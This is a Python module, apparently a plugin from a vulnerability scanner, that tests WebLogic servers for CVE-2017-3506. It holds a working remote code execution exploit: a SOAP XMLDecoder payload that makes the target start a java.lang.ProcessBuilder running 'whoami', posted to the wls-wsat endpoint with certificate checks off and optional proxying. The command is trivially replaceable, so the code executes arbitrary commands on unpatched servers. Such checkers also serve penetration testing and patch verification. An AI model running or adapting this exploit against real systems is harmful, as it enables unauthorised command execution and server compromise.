import requests
import time
from bs4 import BeautifulSoup
import logging
import re

uj=''
http = ''
https = ''
def a2dl15(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global uj
    global http,https
    try:
        proxies = {'http': http,
                   'https': https}
        cmd = 'whoami'
        data = '''
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
          <soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
              <java>
                <object class="java.lang.ProcessBuilder">
                  <array class="java.lang.String" length="3">
                    '''
        for idx, it in enumerate(cmd.split()):
            data += '<void index="{}"><string>{}</string></void>'.format(
                idx, it)
        data += '''
                  </array>
                  <void method="start"/>
                </object>
              </java>
            </work:WorkContext>
          </soapenv:Header>
          <soapenv:Body/>
        </soapenv:Envelope>'''
        headers = {'Content-Type': 'text/xml'}
        logging.captureWarnings(True)
        aa = requests.post(url1+'wls-wsat/CoordinatorPortType',data=data,cookies=s_cookie,headers=headers,proxies=proxies,verify=False, timeout=5)
        if '<faultstring>java.lang.ProcessBuilder' in aa.text or "<faultstring>0" in aa.text:
            uj='[+]漏洞存在\n'+aa.text[0:100]
        else:
            uj='[-]漏洞不存在\n'
    except Exception as aaa:
        uj='[-]请求错误\n'+str(aaa)
def a2jg85():
    global uj
    return '--------------------------------------------------\n[ Weblogic(CVE-2017-3506) ]\n\n'+ str (uj)+'\n'
def a2u85(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)
